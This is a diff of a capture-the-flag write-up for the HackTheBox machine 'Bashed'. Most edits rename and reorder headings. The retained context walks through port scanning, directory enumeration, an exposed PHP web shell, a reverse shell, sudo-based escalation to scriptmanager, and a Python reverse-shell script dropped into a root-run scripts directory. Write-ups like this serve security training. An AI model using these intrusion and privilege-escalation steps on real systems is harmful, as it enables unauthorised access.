@@ -3,14 +3,15 @@ IP Address: 10.10.10.68\
 OS: Linux
 
 
-## Enumeration
-First, let us add the the IP address and host to our ```/etc/hosts``` file
+## Discovery
+Before we start, let's first add the the IP address and host to our ```/etc/hosts``` file
 
 ```
 10.10.10.68    bashed.htb
 ```
 
-Next, let us do a masscan to identify the ports of interest
+### Masscan
+Firstly, we will use masscan to identify the open ports
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -23,16 +24,16 @@ Scanning 1 hosts [131070 ports/host]
 Discovered open port 80/tcp on 10.10.10.68 
 ```
 
-Using the ports obtained from masscan, we will then run a scan using nmap to enumerate the services operating behind each port. For this machine, only port 80 is open, which
-means that only web service is available on this machine.
+### Nmap
+
+Afterwards,we will use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. For this machine, only port 80 is open, which means that only web service is available on this machine.
 
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 80	| http | Apache httpd 2.4.18 ((Ubuntu)) | Open |
 
-## Discovery
-
-First, we will use Gobuster to find the endpoints that are accessible from http://bashed.htb
+### Gobuster
+Next, we will use Gobuster to find the endpoints that are accessible from http://bashed.htb
 
 ```
 ──(kali㉿kali)-[~]
@@ -62,13 +63,16 @@ http://bashed.htb/fonts                (Status: 301) [Size: 308] [--> http://bas
 http://bashed.htb/server-status        (Status: 403) [Size: 298]
 ```
 
-Next, we will try to enumerate for VHosts using Gobuster. However, there doesn't seem to have any interesting outputs. 
+We will also try to enumerate for VHosts using Gobuster. However, there doesn't seem to have any interesting outputs. 
 
+## Exploit
+
+### Spawning web shell
 Navigating to http;//bashed.htb/dev, we notice that there are a few php files that can be accessed. Clicking on the ```phpbash.php``` file, we realize that we have spawned a web shell
 
 ![Spawning web shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bashed/web_shell.PNG)
 
-## Obtaining user flag
+### Obtaining user flag
 
 Using the web shell that we obtained, we will now get our user flag
 
@@ -94,7 +98,7 @@ www-data@bashed:/home/arrexel# cat user.txt
 <Redacted user flag>
 ```
 
-## Obtaining root flag
+### Obtaining a reverse shell
 
 Next we will first create a reverse shell command from the webshell. Intercepting the request, we can modify the body parameters of the request to obtain a reverse shell. 
 
@@ -115,7 +119,7 @@ www-data@bashed:/var/www/html/dev$ stty cols 132 rows 34
 stty cols 132 rows 34
 www-data@bashed:/var/www/html/dev$
 ```
-
+### Privilege Escalation to scriptmanager
 Next, we will execute ```sudo -l``` command to find out if we are able to execute any programs as sudo without password. We realize that we can execute commands as ```scriptmanager``` without any password. Knowing that, we will be able to escalate our privilege into ```scriptmanager```
 
 ```
@@ -185,6 +189,7 @@ drwxr-xr-x 23 root          root            4096 Dec  4  2017 ..
 scriptmanager@bashed:/scripts$ 
 ```
 
+### Privilege Escalation to root
 All we have to do is to save the reverse shell code in a python file in the ```/scripts``` directory and the code will be executed to create a reverse shell.
 
 ```
@@ -197,7 +202,7 @@ os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 ```
 
-All that is left for us to do is to stabilize the shell and get the root flag
+Now, we will have to stabilize the shell.
 
 ```
 ──(kali㉿kali)-[~/Desktop/PE]
@@ -210,6 +215,13 @@ root@bashed:/scripts# export TERM=xterm
 export TERM=xterm
 root@bashed:/scripts# stty cols 132 rows 34
 stty cols 132 rows 34
+root@bashed:/scripts# 
+```
+
+### Obtaining root flag
+All that is left for us to do is to obtain the root flag
+
+```
 root@bashed:/scripts# cd /root
 cd /root
 root@bashed:~# ls
